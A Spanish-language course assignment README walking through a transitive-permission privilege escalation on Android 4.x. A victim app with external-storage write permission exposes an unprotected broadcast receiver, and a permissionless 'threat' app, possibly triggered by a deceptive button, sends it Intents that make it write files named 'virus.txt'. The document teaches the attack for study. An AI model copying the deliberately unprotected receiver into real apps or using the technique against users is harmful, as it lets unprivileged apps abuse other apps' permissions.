# SEGUNDA TAREA CORTA
## Ataque por escalación de privilegios por uso transitivo en Android
Ataque por escalación de privilegios por uso transitivo con el permiso de escritura en almacenamiento externo. Para este caso se utilizara el permiso de escritura en almacenamiento externo.

## Requerimientos recomendados del sistema
- Sistema operativo Android, versión mínima API 15 (IceCreamSandwich) o hasta la versión máxima API 19 (KitKat).
- Memoria RAM: 2GB (Recomendado).
- Pantalla de 4.7" (Recomendado).
- Tarjeta SD (Obligatorio, al menos 2GB).

## Agregar permiso de escritura en almacenamiento externo
- El desarrollador debe crear la aplicación Android (vacía) desde Android Studio.
- Desde el archivo `AndroidManifest.xml` se debe agregar el permiso para la escritura en almacenamiento externo que se presenta a continuación.
```xml
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
```
> **Nota:** Recordar que esto se debe hacer en la aplicación que va a ser afectada.
## Agregar el Broadcast Receiver a Android

- Desde el archivo `AndroidManifest.xml` el desarrollador debe agregar la clase que será la clase receptora que extiende de **BroadcastReceiver** de la siguiente manera:
```xml
<receiver android:name=".IncomingFile">  
	 <intent-filter> 
		 <action android:name="com.appa.appa.WRITE" />  
	 </intent-filter>
 </receiver>
```
> **Nota**: 
> - **IncomingFile:** Se refiere al nombre de la clase que extiende de BroadcastReceiver.
> - **com.appa.appa.WRITE:** Se refiere al nombre del paquete donde esta ubicada la clase anteriormente mencionada, la ultima palabra es un nombre que puede ser remplazado.
> - Recordar que esto se debe hacer en la aplicación que va a ser afectada.
## Aplicación Afectada (AppA)
### Crear clase que sea receptora.
- El desarrollador debe hacer que la clase que ha destinado en el archivo `AndroidManifest.xml` para ser receiver extienda de **BroadcastReceiver** de la siguiente manera:
```java
public class IncomingFile extends BroadcastReceiver {...}  
```
- El desarrollador debe de captar los datos que le ingresen desde un Intent de la siguiente manera:
```java
Bundle bundle = intent.getExtras();  
```
- Los datos recividos se obtendran de la siguiente manera:
```java
String mNombreArchivo = (String) bundle.getString("nombre");  
```
> **Nota:** 
> - **mNombreArchivo:** Nombre a escoger por el desarrollador para la variable que contendrá el dato recibido identificado como `"nombre"` por medio de un **getString()**.

## Aplicación Amenaza (AppB)
### Desarrollo
- El desarrollador debe dejar sin manipular el archivo `AndroidManifest.xml`, pues para esta aplicación no se le consideran permisos. 
- La aplicación puede ejecutar las funciones de inserción de información desde que inicia o por medio de algún método de engaño para los usuarios como puede ser un simple botón.
- Para indicar a cual aplicación se desea invadir se debe agregar un **Intent** especificado el paquete donde esta ubicada la clase tipo receiver de la aplicacion bajo amenaza. Ejemplo:
```java
Intent mDataIntent = new Intent("com.appa.appa.WRITE"); 
```
> **Nota:**
> - **com.appa.appa.WRITE:** Se refiere al nombre del paquete donde esta ubicada la clase receiver, la ultima palabra es un nombre que se establece desde el archivo `AndroidManifest.xml` en la aplicación bajo amenaza.
- Para cada dato que se requiera enviar a la clase receiver se hará de la siguiente manera:
```java 
mDataIntent.putExtra("nombre", "virus.txt");
```
> **Nota:** Notese que el nombre `virus.txt` va a ser el nombre que tomaran los archivos creados por la aplicación **AppB** (Aplicación amenaza).
- Por ultimo se debe enviar los datos para que los capte el receiver de la AppA (Aplicación bajo amenaza) de la siguiente manera:
```java 
getApplicationContext().sendBroadcast(mDataIntent);
```
